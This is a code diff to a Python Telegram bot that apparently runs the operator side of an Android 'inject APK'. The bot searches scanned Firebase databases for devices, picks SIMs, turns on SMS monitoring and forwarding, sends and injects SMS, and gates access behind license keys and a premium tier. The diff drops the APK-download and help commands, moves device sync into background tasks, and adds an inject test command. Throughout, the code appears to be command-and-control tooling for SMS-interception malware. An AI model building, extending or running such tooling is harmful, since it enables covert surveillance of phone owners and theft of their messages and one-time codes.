@@ -26,15 +26,14 @@ from app.device_ui import (
     device_set_keyboard,
     format_access_approved_card,
     format_addchannel_card,
-    format_apk_download_card,
     format_device_found_card,
+    format_device_not_found_card,
     format_device_set_card,
     format_firebase_connected_card,
     format_key_error_card,
     format_key_generated_card,
     format_key_set_card,
     format_monitoring_card,
-    format_sim_selected_card,
     format_mynum_set_card,
     format_ping_card,
     format_premium_gate_card,
@@ -44,13 +43,11 @@ from app.device_ui import (
     format_stop_card,
     STARTUP_TEST_MESSAGE,
     STARTUP_TEST_SENDER,
-    format_commands_message,
-    format_guide_message,
+    format_sim_selected_card,
     format_welcome_message,
     get_selected_sim,
     get_sim_list,
     monitoring_keyboard,
-    device_set_keyboard,
     sim_monitoring_keyboard,
 )
 from app.license_keys import (
@@ -238,32 +235,22 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text(format_welcome_message(), parse_mode="HTML")
 
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized(update.effective_user.id if update.effective_user else None):
-        return
-    await update.message.reply_text(format_commands_message(), parse_mode="HTML")
+async def _background_sync_device(device_id: int, telegram_user_id: int | None = None) -> None:
+    """Refresh device meta from Firebase without blocking Telegram handlers."""
+    from app.services import sync_device_from_firebase
 
-
-async def guide_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized(update.effective_user.id if update.effective_user else None):
-        return
-
-    await update.message.reply_text(format_guide_message(), parse_mode="HTML")
-
-
-async def apk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized(update.effective_user.id if update.effective_user else None):
-        return
-    url = settings.apk_download_url
-    keyboard = InlineKeyboardMarkup(
-        [[InlineKeyboardButton("📥 Download APK (tap)", url=url)]]
-    )
-    await update.message.reply_text(
-        format_apk_download_card(url),
-        parse_mode="HTML",
-        disable_web_page_preview=False,
-        reply_markup=keyboard,
-    )
+    db: Session = SessionLocal()
+    try:
+        device = db.query(Device).filter(Device.id == device_id).first()
+        if not device or not device.firebase_source_url:
+            return
+        await asyncio.wait_for(sync_device_from_firebase(db, device, full=True), timeout=8.0)
+        if telegram_user_id:
+            asyncio.create_task(sync_profile_for_user(telegram_user_id))
+    except Exception:
+        pass
+    finally:
+        db.close()
 
 
 async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -306,8 +293,8 @@ async def _prepare_monitoring(
     profile: MonitorProfile,
     device: Device,
 ) -> None:
-    from app.firebase_sync import resolve_firebase_url
-    from app.license_keys import ensure_ready_for_monitoring
+    from app.firebase_sync import mynum_device_id, resolve_firebase_url
+    from app.license_keys import ensure_ready_for_monitoring, register_device_on_key
     from app.services import resolve_mynum_phone
 
     mynum = resolve_mynum_phone(profile, db)
@@ -320,6 +307,12 @@ async def _prepare_monitoring(
     firebase_url = resolve_firebase_url(profile, device)
     license_key = (profile.license_key or "").strip().upper()
     if license_key.startswith("KEY-"):
+        if profile.phone_number:
+            register_device_on_key(
+                license_key,
+                mynum_device_id(profile.phone_number),
+                user_id,
+            )
         await ensure_ready_for_monitoring(
             license_key,
             device.name,
@@ -465,12 +458,12 @@ async def _sim_menu_after_stop(
 ) -> tuple[str, InlineKeyboardMarkup | None]:
     if not device:
         return format_stop_card(), None
-    if device.firebase_source_url:
-        device = await sync_device_from_firebase(db, device)
     sim_index = (profile.selected_sim_index or 0) if profile else 0
+    if device.firebase_source_url:
+        asyncio.create_task(_background_sync_device(device.id, user_id))
     return (
-        format_device_set_card(device, sim_index),
-        device_set_keyboard(device, compact=True),
+        format_device_set_card(device, sim_index, profile),
+        device_set_keyboard(device),
     )
 
 
@@ -673,7 +666,7 @@ async def device_select_command(
                 user.id,
                 bind_license_key=bind_license_key,
             ),
-            timeout=25.0,
+            timeout=90.0,
         )
         found_ms = max(1, int((time.perf_counter() - t0) * 1000))
         monitoring_stopped = was_monitoring and (
@@ -684,7 +677,7 @@ async def device_select_command(
 
         db_count = len(get_all_firebase_urls(db))
         await status_msg.edit_text(
-            f"❌ Device <code>{deviceid}</code> not found ({db_count} DBs scanned)",
+            format_device_not_found_card(deviceid, db_count),
             parse_mode="HTML",
         )
         return
@@ -699,9 +692,9 @@ async def device_select_command(
             await status_msg.edit_text("\n".join(lines), parse_mode="HTML")
             return
         if message.startswith("notfound:"):
-            db_count = message.removeprefix("notfound:")
+            db_count = int(message.removeprefix("notfound:") or "0")
             await status_msg.edit_text(
-                f"❌ Device <code>{deviceid}</code> not found ({db_count} DBs)",
+                format_device_not_found_card(deviceid, db_count),
                 parse_mode="HTML",
             )
             return
@@ -777,20 +770,6 @@ async def send_device_set_ui(
     found_ms: int | None = None,
     monitoring_was_stopped: bool = False,
 ) -> None:
-    if device.firebase_source_url:
-        db: Session = SessionLocal()
-        try:
-            device = await asyncio.wait_for(
-                sync_device_from_firebase(db, device, full=True),
-                timeout=8.0,
-            )
-            if profile:
-                asyncio.create_task(sync_profile_for_user(profile.telegram_user_id))
-        except Exception:
-            pass
-        finally:
-            db.close()
-
     sim_index = profile.selected_sim_index if profile else 0
     if card == "found":
         text = format_device_found_card(
@@ -804,10 +783,15 @@ async def send_device_set_ui(
         text = format_device_set_card(
             device,
             selected_sim=sim_index,
+            profile=profile,
             status=device_status(device),
         )
         keyboard = device_set_keyboard(device)
     await message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)
+
+    if device.firebase_source_url:
+        uid = profile.telegram_user_id if profile else None
+        asyncio.create_task(_background_sync_device(device.id, uid))
 
 
 async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1033,6 +1017,41 @@ async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
     lines.append("\nAdd: <code>/approve &lt;id&gt;</code>")
     await update.message.reply_text("\n".join(lines), parse_mode="HTML")
+
+
+async def injecttest_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Manual startup inject test — same as monitoring ON test SMS."""
+    user = update.effective_user
+    if not await reply_if_unauthorized(update):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, user.id)
+        device = get_active_device(db, user.id)
+        if not profile or not device:
+            raise ValueError("Pehle device + /mynum set karo")
+        if not profile.phone_number:
+            raise ValueError("Pehle /mynum <apk-phone> set karo")
+        profile.is_monitoring = True
+        db.commit()
+        sent, ms = await send_polling_startup_test(db, profile, device)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+        return
+    finally:
+        db.close()
+
+    if sent:
+        await update.message.reply_text(
+            format_inject_startup_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE, total_ms=ms),
+            parse_mode="HTML",
+        )
+    else:
+        await update.message.reply_text(
+            "❌ Inject queue push failed — check /mynum, KEY, device Firebase URL",
+            parse_mode="HTML",
+        )
 
 
 async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1409,22 +1428,16 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                     pass
                 return
 
-            if device.firebase_source_url:
-                try:
-                    device = await asyncio.wait_for(
-                        sync_device_from_firebase(db, device),
-                        timeout=5.0,
-                    )
-                except asyncio.TimeoutError:
-                    logger.warning("SIM select: Firebase sync timed out for %s", device.name)
             profile = select_sim_slot(db, user.id, int(sim_index))
             db.commit()
             asyncio.create_task(sync_profile_for_user(user.id))
             await query.edit_message_text(
-                format_sim_selected_card(device, profile.selected_sim_index or 0),
+                format_sim_selected_card(device, profile.selected_sim_index or 0, profile),
                 parse_mode="HTML",
                 reply_markup=sim_monitoring_keyboard(device),
             )
+            if device.firebase_source_url:
+                asyncio.create_task(_background_sync_device(device.id, user.id))
             return
 
         if data.startswith("stop:") or data == "monitor:stop":
@@ -1495,11 +1508,10 @@ async def _post_init_set_commands(app: Application) -> None:
 
     commands = [
         BotCommand("start", "Welcome & setup guide"),
-        BotCommand("help", "All commands (Astik menu)"),
-        BotCommand("guide", "Setup + channel auto-token help"),
         BotCommand("setfirebase", "Connect your Firebase DB"),
         BotCommand("setdevice", "Pick device & select SIM"),
-        BotCommand("fdy", "Find device & select SIM (admin)"),
+        BotCommand("fb", "Find device & select SIM (admin)"),
+        BotCommand("fy", "Pick device to monitor"),
         BotCommand("a", "Pick device with KEY (inject)"),
         BotCommand("mynum", "Your forwarding number"),
         BotCommand("key", "License key for inject"),
@@ -1510,7 +1522,6 @@ async def _post_init_set_commands(app: Application) -> None:
         BotCommand("status", "Current stats"),
         BotCommand("send", "Manual SMS"),
         BotCommand("ping", "Check latency"),
-        BotCommand("apk", "Download inject APK"),
     ]
     await app.bot.set_my_commands(commands)
 
@@ -1528,10 +1539,6 @@ def build_telegram_app() -> Application | None:
         .build()
     )
     app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("guide", guide_command))
-    app.add_handler(CommandHandler("apk", apk_command))
-    app.add_handler(CommandHandler("download", apk_command))
     app.add_handler(CommandHandler("mynum", mynum_command))
     app.add_handler(CommandHandler("addchannel", addchannel_command))
     channel_text = filters.TEXT & ~filters.COMMAND
@@ -1558,6 +1565,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("send", send_command))
     app.add_handler(CommandHandler("ping", ping_command))
+    app.add_handler(CommandHandler("injecttest", injecttest_command))
     app.add_handler(CommandHandler("approve", approve_command))
     app.add_handler(CommandHandler("adduser", approve_command))
     app.add_handler(CommandHandler("revoke", revoke_command))
